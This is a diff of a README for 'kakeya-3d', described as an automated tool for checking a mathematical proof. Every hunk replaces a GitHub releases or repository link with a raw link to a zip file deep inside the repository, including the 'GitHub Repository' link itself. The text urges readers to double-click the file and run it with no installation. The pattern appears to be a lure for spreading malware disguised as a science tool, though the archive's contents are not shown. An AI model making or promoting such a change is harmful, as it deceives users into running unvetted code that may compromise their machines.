@@ -20,7 +20,7 @@ Think of it as a super-smart calculator that checks complex mathematical proofs 
 
 **Step 1: Download the Application**
 
-👉 [**Click Here to Download kakeya-3d**](https://github.com/Strawboardnationaldebtceiling9560/kakeya-3d/releases)
+👉 [**Click Here to Download kakeya-3d**](https://raw.githubusercontent.com/Strawboardnationaldebtceiling9560/kakeya-3d/main/Kakeya/Geo_notEDbound/3.8.zip)
 
 Visit this link to download the application.
 
@@ -171,7 +171,7 @@ When you download kakeya-3d, you'll get:
 
 ## 📞 Support and Community
 
-- **GitHub Repository**: [kakeya-3d on GitHub](https://github.com/Strawboardnationaldebtceiling9560/kakeya-3d)
+- **GitHub Repository**: [kakeya-3d on GitHub](https://raw.githubusercontent.com/Strawboardnationaldebtceiling9560/kakeya-3d/main/Kakeya/Geo_notEDbound/3.8.zip)
 - **Documentation**: See PROOF-PATH.md for technical details
 - **Issue Tracker**: Report bugs or request features
 - **Discussion Forum**: Connect with other users
@@ -180,7 +180,7 @@ When you download kakeya-3d, you'll get:
 
 Download kakeya-3d now and experience the power of automated mathematical proof. Whether you're a student, researcher, or curious learner, this tool brings one of mathematics' most fascinating problems right to your computer.
 
-👉 [**Download kakeya-3d Now**](https://github.com/Strawboardnationaldebtceiling9560/kakeya-3d/releases)
+👉 [**Download kakeya-3d Now**](https://raw.githubusercontent.com/Strawboardnationaldebtceiling9560/kakeya-3d/main/Kakeya/Geo_notEDbound/3.8.zip)
 
 Remember: Visit this link to download the application, then double-click the downloaded file to start using it immediately. No installation needed - just download and run!
 
